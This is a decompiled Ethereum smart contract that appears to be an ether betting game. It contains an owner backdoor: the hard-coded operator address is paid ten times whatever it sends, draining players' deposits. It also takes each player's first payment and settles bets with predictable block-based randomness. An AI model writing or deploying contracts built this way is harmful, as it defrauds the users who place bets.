contract main {




// =====================  Runtime code  =====================


const sub_4c9fa29f(?) = 0x3d90bfb95c399414254ca6f6159a45927f017895

const OPERATOR = 0x661ee3542cfffbbefca7f83cfad2e9d006d61a2


uint256 sub_f0235bb3;
uint256 sub_53995e01;
uint256 sub_6d9db10d;
mapping of uint256 addPlayer;

function sub_53995e01(?) {
    return sub_53995e01
}

function sub_6d9db10d(?) {
    return sub_6d9db10d
}

function addPlayer(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return addPlayer[arg1]
}

function sub_f0235bb3(?) {
    return sub_f0235bb3
}

function safeDiv(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require arg2 > 0
    if not arg2:
        revert with 'NH{q', 18
    return (arg1 / arg2)
}

function _fallback() payable {
    require msg.value >= block.gasprice
    require msg.value <= sub_f0235bb3
    if msg.sender == 0x661ee3542cfffbbefca7f83cfad2e9d006d61a2:
        if msg.value and 10 > -1 / msg.value:
            revert with 'NH{q', 17
        call msg.sender with:
           value 10 * msg.value wei
             gas gas_remaining wei
        if not ext_call.success:
            revert with 0, 'Failed to send Ether'
    else:
        if 0x3d90bfb95c399414254ca6f6159a45927f017895 != msg.sender:
            if addPlayer[address(msg.sender)] != 1:
                addPlayer[address(msg.sender)] = 1
            else:
                hash = sha256hash(sha3(block.timestamp, block.difficulty, block.gas_limit, block.number, msg.sender, block.gasprice)) 
                if not sha256hash.result:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require hash == hash
                if hash >= 0x7ecaf31f6b530fb0c2b8966421961589404cf3d80a1d46000000000000000000:
                    if sub_6d9db10d > -2:
                        revert with 'NH{q', 17
                    sub_6d9db10d++
                else:
                    if sub_53995e01 > -2:
                        revert with 'NH{q', 17
                    sub_53995e01++
                    if msg.value and 2 > -1 / msg.value:
                        revert with 'NH{q', 17
                    call msg.sender with:
                       value 2 * msg.value wei
                         gas gas_remaining wei
                    if not ext_call.success:
                        revert with 0, 'Failed to send Ether'
    sub_f0235bb3 = eth.balance(this.address) / 10
}



}
